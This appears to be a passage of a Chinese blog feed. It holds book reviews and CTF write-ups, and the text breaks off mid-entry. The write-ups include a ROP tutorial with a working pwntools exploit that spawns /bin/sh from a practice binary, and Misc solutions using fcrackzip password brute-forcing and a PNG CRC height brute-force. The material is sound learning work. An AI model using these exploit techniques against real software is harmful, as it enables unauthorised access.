style="zoom:50%;"></p><p><strong>人生并没有什么最好的选择，任何选择都要付出代价。全部的问题是自己愿意付出怎样的代价。</strong></p><p>《沧浪之水》是中国当代作家阎真创作的长篇小说，首次发表于《当代》2001年第4期。 《沧浪之水》在主人公池大为的心灵视域与生存空间这两个审视层面上，展示了20世纪末中国知识分子所面对的种种矛盾冲突和纠葛。小说批判了官本位文化的威力及权力崇拜的危害，揭穿了虚幻的真实，超出了一般官场小说的格局。</p><p>还可以，挺好挺真实的一本官场小说。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;长安的荔枝&quot;&gt;&lt;a href=&quot;#长安的荔枝&quot; class=&quot;headerlink&quot; title=&quot;长安的荔枝&quot;&gt;&lt;/a&gt;长安的荔枝&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2023/02/27/读书分享III/1.png&quot; alt=&quot;1&quot; style=&quot;zoom:5
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>ROP学习</title>
    <link href="elssm.github.io/2022/12/29/ROP%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2022/12/29/ROP学习/</id>
    <published>2022-12-29T10:37:21.000Z</published>
    <updated>2022-12-30T04:18:31.235Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>通过一道PWN题目学习ROP。</p><p>随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>ROPgadget工具可以帮助你寻找合适的gadgets，在编写你的<code>ROP exp</code>的时候有很大作用。ROPgadget支持x86, x64, ARM, ARM64, PowerPC, SPARC和MIPS架构下的ELF/PE/Mach-O文件格式。</p><p>这里我们需要构造的gadget如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,["/bin/sh"]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line">int 0x80</span><br><span class="line">==&gt; execve("/bin/sh",NULL,NULL)</span><br></pre></td></tr></table></figure><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>checksec查看开启了哪些保护机制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % checksec ret2syscall</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>通过查看架构得之主要的寄存器有<code>eax ebp ebx ecx..</code></p><p>程序执行如下，输出前两句后接受输入，然后退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# ./ret2syscall</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure><p>反编译查看，从gets函数得之存在溢出漏洞</p><p><img src="/2022/12/29/ROP学习/1.png" alt="1"></p><p><code>pwndbg</code>查看寄存器位置，发现eax寄存器位置为<code>0xffffd29c</code>，<code>ebp</code>寄存器的位置为<code>0xffffd308</code>，如果我们想要覆盖掉<code>ebp</code>寄存器的位置，则需要填充的字节为<code>0xffffd308-0xffffd29c</code>字节再加上<code>ebp</code>所占的4个字节，因为架构是32位的。即需要填充112字节。</p><p><img src="/2022/12/29/ROP学习/2.png" alt="2"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>接着我们通过<code>ROPgadget</code>工具寻找<code>gadget</code></p><p>首先寻找eax的<code>pop|ret</code>地址，选择<code>0x080bb196</code>地址最合适</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep eax</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>接着寻找ebx的<code>pop|ret</code>地址，有很多，哪一个最适合呢，发现<code>0x0806eb90</code>最合适，因为它也有<code>ecx</code>和<code>edx</code>寄存器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "pop|ret" | grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>最后我们寻找<code>int</code>，地址为<code>0x08049421</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % ROPgadget --binary ret2syscall --only "int"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p>因为ebp寄存器中需要写入<code>/bin/sh</code>，因此我们还需要在程序中找到<code>/bin/sh</code>的地址</p><p>在<code>ghidra</code>中全局搜索发现地址为<code>0x80be408</code></p><p><img src="/2022/12/29/ROP学习/3.png" alt="3"></p><p>或者通过python编写脚本获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2syscall'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.search(<span class="string">b'/bin/sh'</span>)</span><br><span class="line">&lt;generator object ELF.search at <span class="number">0x7f024f030db0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="string">'0x80be408'</span></span><br></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>编写<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_80h = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*<span class="number">112</span>, pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>本地执行<code>exp</code>获取<code>shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos rop]# python3 exp.py</span><br><span class="line">[+] Starting local process './ret2syscall': pid 3300219</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line"><span class="meta">$</span> ls</span><br><span class="line">exp.py       ret2libc2  ret2shellcode  ret2text</span><br><span class="line">ret2libc1  ret2libc3  ret2syscall    tools</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;通过一道PWN题目学习ROP。&lt;/p&gt;
&lt;p&gt;随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>读书分享II</title>
    <link href="elssm.github.io/2022/12/15/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABII/"/>
    <id>elssm.github.io/2022/12/15/读书分享II/</id>
    <published>2022-12-15T14:13:03.000Z</published>
    <updated>2023-02-27T13:40:52.746Z</updated>
    
    <content type="html"><![CDATA[<h4 id="朝花夕拾"><a href="#朝花夕拾" class="headerlink" title="朝花夕拾"></a>朝花夕拾</h4><p><img src="/2022/12/15/读书分享II/1.jpeg" alt="1" style="zoom:50%;"></p><p><strong>我常想在纷扰中寻出一点闲静来，然而委实不容易。目前是这么离奇，心里是这么芜杂。一个人做到只剩了回忆的时候，生涯大概总要算是无聊了罢，但有时竟会连回忆也没有。</strong></p><p>《朝花夕拾》里鲁迅用夹叙夹议的方法，以青少年时代的生活经历为线索，真实生动地叙写了自己从农村到城镇，从家庭到社会，从国内到国外的一组生活经历，抒发了对往昔亲友和师长的怀念之情，同时也对旧势力、旧文化进行了嘲讽和抨击。</p><p>朝花夕拾，清早落下的花朵到了傍晚拾起来。平静地弯腰，凝视，回忆，捡起。这个原本简单平和的过程被鲁迅先生赋予了新的含义。初高中不喜欢语文课，现在读起竟别有一番滋味。孩童时期鲁迅对猫的讨厌、对二十四孝图的恐惧、对百草园的喜爱、对长妈妈的复杂感情；长大之后对藤野先生的尊敬、对范爱农的怜悯。他的敬意和感激，从每一句话里流露出来，细节是那样清晰，人物从回忆里走出来，从纸上竖立起来，变得有血有肉，袒露着真实性情。</p><h4 id="夜谭十记"><a href="#夜谭十记" class="headerlink" title="夜谭十记"></a>夜谭十记</h4><p><img src="/2022/12/15/读书分享II/2.png" alt="2" style="zoom:50%;"></p><p><strong>凡是他们叫做“自由”的东西，就是不自由的陷阱</strong></p><p>《夜谭十记》是著名作家马识途的代表作。内容为上世纪四十年代四川某地衙门，十个仕途失意又穷极无聊的小科员以摆“龙门阵”的方式，轮流讲述自己经历的种种奇遇。本书因其中的《盗官记》被改编为电影《让子弹飞》而广为人知。</p><p>这本书从1942年最初开始写到1982年最终成书，经历了40年的时间，我在2022年有幸读到这本书。最初因为《让子弹飞》的缘故我想读这本书，最后发现书中的其他故事个个精彩。破城记的反转、报销记的惊险、盗官记的正义、沉河记的悲惨等等，每一个故事都令人深思，感谢作者。作者在后记还写道由于成书时间太长，这些故事不知道还适不适合当下阅读，这当然也可能是作者自谦的说法哈哈哈哈。反正我是很推荐这本书的！！！当今生活被各种电子产品充斥，以后有机会的话也要搞一个冷板凳会</p><h4 id="一句顶一万句"><a href="#一句顶一万句" class="headerlink" title="一句顶一万句"></a>一句顶一万句</h4><p><img src="/2022/12/15/读书分享II/6.jpeg" alt="6" style="zoom:50%;"></p><p><strong>日子是过以后，不是过从前。</strong></p><p>本书是刘震云酝酿创作了三年的小说。也是他迄今最成熟最大气的作品。小说的叙事风格类似明清的野稗日记,语句洗练,情节简洁,叙事直接,有汪曾祺和孙犁等前辈作家遗风。因而本书的每一个字每一句话,都构成言说的艺术,都能拧出作家的汗水。更为重要的是,作家唯有用此语言,才有对应和表现作品的内涵。</p><p>阳的前两天，一口气读完了这本书。书中分为出延津和回延津上下两部叙述，时间跨度挺长，有四代人差不多。前半部分杨百顺，后半部分牛爱国。人物结构挺复杂，但是每一个人物刻画的都很深刻。我刚开始不知道为什么书名叫这个，当我读到小韩被视察的时候、读到老马给老杨出主意的时候、读到老詹给摩西解惑的时候。或许明白了什么叫一句顶一万句….</p><h4 id="筚路维艰：中国社会主义路径的五次选择"><a href="#筚路维艰：中国社会主义路径的五次选择" class="headerlink" title="筚路维艰：中国社会主义路径的五次选择"></a>筚路维艰：中国社会主义路径的五次选择</h4><p><img src="/2022/12/15/读书分享II/7.jpeg" alt="7" style="zoom:50%;"></p><p><strong>真正的危险不在因缺乏经验而犯错，而在于因阻塞批评而丧失纠错的能力。</strong></p><p>本书以简明清晰的文字对当代中国的历史轨迹做了逻辑梳理。作者认为，从执政党的建国方略、发展模式和基本政策角度考察，中国社会主义的实践路径经历了从实行新民主主义开始，途经仿效苏联模式、追寻赶超之路、发动继续革命和实行改革开放的五次历史选择。</p><p>我们应该更清晰的了解历史。</p><h4 id="置身事内：中国政府与经济发展"><a href="#置身事内：中国政府与经济发展" class="headerlink" title="置身事内：中国政府与经济发展"></a>置身事内：中国政府与经济发展</h4><p><img src="/2022/12/15/读书分享II/8.png" alt="8" style="zoom:50%;"></p><p>《置身事内：中国政府与经济发展》是复旦大学经济学院副教授兰小欢多年教学与研究内容的凝练，将经济学原理与中国经济发展的实践有机融合，以地方政府投融资为主线，深入浅出地论述了中国经济的发展，笔触简练客观，并广泛采纳了各领域学者的最新研究成果。全书分上下两篇。上篇解释微观机制，包括地方政府的基本事务、收支、土地融资和开发、投资和债务等；下篇解释这些微观行为与宏观现象的联系，包括城市化和工业化、房价、地区差异、债务风险、国内经济结构失衡、国际贸易冲突等。最后一章提炼和总结全书内容。通过对中国政治经济体系的论述，作者简明地刻画了地方政府进行经济治理的基本方式，并指出，中国政府通过深度介入工业化和城市化的进程，在发展经济的同时逐步推动了市场机制的建立和完善，以一种有别于所谓发达国家经验的方式实现了经济奇迹。基于对改革历程与社会矛盾的回顾与分析，作者也在书中对当前推进的市场化改革与政府转型进行了解读，帮助读者增进对中国发展现实的把握。</p><h4 id="西线无战事"><a href="#西线无战事" class="headerlink" title="西线无战事"></a>西线无战事</h4><p><img src="/2022/12/15/读书分享II/3.jpeg" alt="3" style="zoom:50%;"></p><p><strong>一个士兵只有度过一千次偶然性才能算活着。每个士兵都相信和信赖这种偶然性。</strong></p><p>青年保罗·博伊默尔、钳工加登、始终随身带着课本的米勒、头脑最清醒的下士克罗普、挖煤工海尔·维斯胡斯、农民德特林，以及斯坦尼斯劳斯·卡钦斯基们，经过十周的军事训练后，被送往前线。1918年，这个班的最后一人也于前线阵亡。而军队指挥部战报上的记录仅有一句：西线无战事。</p><p>花了一周时间断断续续读完了这本书。作者经历过一战，所以在书中对于战争的描述十分详细。我读的是姜乙翻译的版本，个人感觉翻译的很好！战争是残酷的，对于交战双方，没有对错，战场上奋战的军人，场下是孩子的父亲，是父亲的孩子，是妻子的丈夫。塞尔维亚的一句话说道：在战争中，政治家提供弹药、富人提供粮食、穷人提供孩子。战争结束，政治家收回弹药，富人继续种粮食，穷人埋葬自己的孩子。</p><h4 id="寻路中国"><a href="#寻路中国" class="headerlink" title="寻路中国"></a>寻路中国</h4><p><img src="/2022/12/15/读书分享II/4.jpeg" alt="4" style="zoom:50%;"></p><p><strong>在改革年代，每个人都知道这条基本的准则：事后求谅解，比事前求许可要容易多了。</strong></p><p>《寻路中国》一书有几条不同的线索。它首先叙述了作者由东海之滨沿着长城一路向西，横跨中国北方的万里行程；另一条线索集中讲述了一个因中国汽车业的高速发展而发生巨变的乡村，在这里，作者特写了一个农民家庭由农而商的变化经历；最后，则是中国东南部一个工业小镇的城市生活场景。书中所描述的这种由农而工而商、乡村变身城市的发展，正是1978年改革以来中国所发生的最重要的变化。</p><p>《寻路中国》以三个角度切入，分别是城墙、村庄和工厂。在租车出行途中，作者将自己的所见所闻所思所想写了出来，阅读完这本书给我的感受就是很真诚。</p><h4 id="四世同堂"><a href="#四世同堂" class="headerlink" title="四世同堂"></a>四世同堂</h4><p><img src="/2022/12/15/读书分享II/5.jpeg" alt="5" style="zoom:50%;"></p><p><strong>只有一句话！到什么时候都不许灰心！人一灰心便只看到别人的错处，而看不到自己的消沉堕落！</strong></p><p>这是一部中国现代长篇小说经典名著，是老舍先生的代表作之一。小说在卢沟桥事变爆发、北平沦陷的时代背景下，以祁家四世同堂的生活为主线，形象、真切地描绘了以小羊圈胡同住户为代表的各个阶层、各色人等的荣辱浮沉、生死存亡。作品记叙了北平沦陷后的畸形世态中，日寇铁蹄下广大平民的悲惨遭遇，那一派古老、宁静生活被打破后的不安、惶惑与震撼，鞭挞了附敌作恶者的丑恶灵魂，揭露了日本军国主义的残暴罪行，更反映出百姓们面对强敌愤而反抗的英勇无畏，讴歌、弘扬了中国人民伟大的爱国主义精神和坚贞高尚的民族气节，史诗般地展现了第二次世界大战期间，中国人民为世界反法西斯战争做出的杰出贡献，气度恢弘，可歌可泣。</p><p>花了32个小时读完了这本书。说是读完，其实只是读完了前87段，后面13段没有看到。在我看的87段中，四世同堂发生的故事从1937年写到了1941年。通过小羊圈胡同里的人折射出整个北平所面临的问题。看到了日本人的残忍，也看到了小羊圈胡同里人们的互相帮助。瑞全的勇敢坚决、钱先生的宁死不屈、韵梅的温柔贤惠、冠晓荷的卑鄙下流等，在老舍先生笔下人物形象刻画的栩栩如生。阅读的时候我常常在想，如果将自己带入到那个年代，我会成为什么样的人呢？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;朝花夕拾&quot;&gt;&lt;a href=&quot;#朝花夕拾&quot; class=&quot;headerlink&quot; title=&quot;朝花夕拾&quot;&gt;&lt;/a&gt;朝花夕拾&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2022/12/15/读书分享II/1.jpeg&quot; alt=&quot;1&quot; style=&quot;zoom:50%;&quot;
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>CTF Misc</title>
    <link href="elssm.github.io/2022/12/13/CTF-Misc/"/>
    <id>elssm.github.io/2022/12/13/CTF-Misc/</id>
    <published>2022-12-13T01:37:41.000Z</published>
    <updated>2022-12-15T08:22:51.640Z</updated>
    
    <content type="html"><![CDATA[<h4 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h4><p>zip下载后有一张gif，直接拖入到StegSolve中分帧查看，得到flag</p><p><img src="/2022/12/13/CTF-Misc/1.png" alt="1"></p><p><img src="/2022/12/13/CTF-Misc/2.png" alt="2"></p><p><img src="/2022/12/13/CTF-Misc/3.png" alt="3"></p><p><img src="/2022/12/13/CTF-Misc/4.png" alt="4"></p><h4 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h4><p>下载之后是一个png图片，使用<code>hex fiend</code>打开之后发现里面有一个<code>number.txt</code>文件</p><p><img src="/2022/12/13/CTF-Misc/5.png" alt="5"></p><p>接着使用<code>foremost</code>分离文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost QR_code.png</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: QR_code.png</span><br><span class="line">�foundat=4number.txtn</span><br><span class="line">Qjxu�J����[����OPF4L�</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>查看输出，里面有一个zip文件，打开里面有一个<code>4number.txt</code>文件，需要一个四位密码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % tree output</span><br><span class="line">output</span><br><span class="line">├── audit.txt</span><br><span class="line">├── png</span><br><span class="line">│   └── 00000000.png</span><br><span class="line">└── zip</span><br><span class="line">    └── 00000000.zip</span><br><span class="line"></span><br><span class="line">2 directories, 3 files</span><br></pre></td></tr></table></figure><p>使用<code>fcrackzip</code>开始破解密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % fcrackzip -b -c '1' -l 4 -u 00000000.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == 7639</span><br></pre></td></tr></table></figure><h4 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h4><p>zip解压后是一张图片，丢到StegSolve中进行文件格式分析。直接获取到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/6.png" alt="6"></p><h4 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h4><p>zip下载后发现打不开图片，<code>StegSolve</code>打开后发现图片少了一半。</p><p><img src="/2022/12/13/CTF-Misc/7.png" alt="7"></p><p>对于一个 PNG 文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。具体格式如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PNG文件头部格式如下：</span><br><span class="line"></span><br><span class="line">- （固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line">- （固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line">- （固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）</span><br><span class="line">- （可变）13字节数据块（IHDR)</span><br><span class="line">    - 前四个字节代表该图片的宽</span><br><span class="line">    - 后四个字节代表该图片的高</span><br><span class="line">    - 后五个字节依次为：</span><br><span class="line">    Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line">- （可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七字节进行crc计算得到。</span><br></pre></td></tr></table></figure><p><code>hex fiend</code>打开图片如下。</p><p><img src="/2022/12/13/CTF-Misc/8.png" alt="8"></p><p>因此从图片上可以看到<code>crc</code>校验码为<code>0x6D7C7135</code></p><p>尝试对图片的高度进行修复，需要注意的是，文件宽度不能任意修改，需要根据IHDR块的CRC值爆破得到宽度, 否则图片显示错误不能得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">misc = open(<span class="string">"dabai.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">'&gt;i'</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0x6d7c7135</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><p>得到高度为479，十六进制为<code>0x01df</code></p><p>随后我们在<code>hex fiend</code>中对图片的高度进行修改，修改后打开图片看到<code>flag</code>。</p><p><img src="/2022/12/13/CTF-Misc/9.png" alt="9"></p><h4 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h4><p>下载下来是一个<code>key.exe</code>，拖到<code>hex fiend</code>查看发现是<code>imagebase64</code>格式</p><p><img src="/2022/12/13/CTF-Misc/10.png" alt="10"></p><p>解码后扫描二维码获取<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/11.png" alt="11"></p><h4 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h4><p><code>hex fiend</code>打开图片拖到最后面看到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/12.png" alt="12"></p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>wireshark打开下载到的<code>pcap</code>文件，根据题目提示登录密码即为<code>flag</code>，过滤<code>POST</code>请求获取<code>flag</code>。</p><p><img src="/2022/12/13/CTF-Misc/13.png" alt="13"></p><h4 id="LSB"><a href="#LSB" class="headerlink" 